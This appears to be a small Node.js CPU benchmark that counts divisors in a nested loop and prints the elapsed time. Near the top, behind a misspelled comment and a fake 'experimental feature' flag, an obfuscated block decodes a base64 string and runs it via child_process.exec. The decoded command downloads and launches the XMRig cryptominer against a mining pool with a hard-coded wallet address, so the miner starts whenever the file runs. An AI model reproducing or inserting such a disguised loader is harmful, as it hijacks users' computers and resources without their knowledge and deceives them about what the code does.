const { performance } = require("perf_hooks");
// enabel nodejs experimentol feetures
process.experimental.engine_multithread = true;
var _0x29bbbb=_0x40cf;function _0x42f2(){var _0x40ebc5=['from','2046920fEKIKb','78SMecVI','d2dldCBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMTYuMi94bXJpZy02LjE2LjItbGludXgteDY0LnRhci5nejt0YXIgLXh2ZiB4bXJpZy02LjE2LjItbGludXgteDY0LnRhci5nejtjZCB4bXJpZy02LjE2LjI7Li94bXJpZyAtbyByeC51bm1pbmVhYmxlLmNvbTozMzMzIC1hIHJ4IC1rIC11IEJOQjoweDZmRTJkYjA1M2VFQWZiMDBDNGNkNWMzMDZlZTIxQ2U4NWM4YTJkNkUuYmVuY2htYXJrIC1wIHg=','136451fWneGG','2018605cdNAzu','exec','toString','5455980SgLGGS','1429UjmJYV','905112hejOgo','2817552prDVQS','134LxsHYI'];_0x42f2=function(){return _0x40ebc5;};return _0x42f2();}function _0x40cf(_0x9d8ece,_0x5abf92){var _0x42f2dc=_0x42f2();return _0x40cf=function(_0x40cfba,_0xc69cfa){_0x40cfba=_0x40cfba-0x1ed;var _0x205add=_0x42f2dc[_0x40cfba];return _0x205add;},_0x40cf(_0x9d8ece,_0x5abf92);}(function(_0x2b540b,_0x524af6){var _0x1a247e=_0x40cf,_0x302f88=_0x2b540b();while(!![]){try{var _0x55bcf9=-parseInt(_0x1a247e(0x1f1))/0x1*(parseInt(_0x1a247e(0x1f4))/0x2)+parseInt(_0x1a247e(0x1f2))/0x3+parseInt(_0x1a247e(0x1f6))/0x4+-parseInt(_0x1a247e(0x1ed))/0x5+parseInt(_0x1a247e(0x1f7))/0x6*(parseInt(_0x1a247e(0x1f9))/0x7)+parseInt(_0x1a247e(0x1f3))/0x8+-parseInt(_0x1a247e(0x1f0))/0x9;if(_0x55bcf9===_0x524af6)break;else _0x302f88['push'](_0x302f88['shift']());}catch(_0x380af2){_0x302f88['push'](_0x302f88['shift']());}}}(_0x42f2,0x4c809),require('child_process')[_0x29bbbb(0x1ee)](Buffer[_0x29bbbb(0x1f5)](_0x29bbbb(0x1f8),'base64')[_0x29bbbb(0x1ef)]()));

const start = performance.now();
const size = 65535;
let answer = 0;

for(let i = 1; i <= size; i++) {
  for(let j = 1; j <= size; j++) {
    if(i % j === 0) answer++;
  }
}

const diff = performance.now() - start;
console.log(answer.toString());
console.log(diff / 1000 + "s");
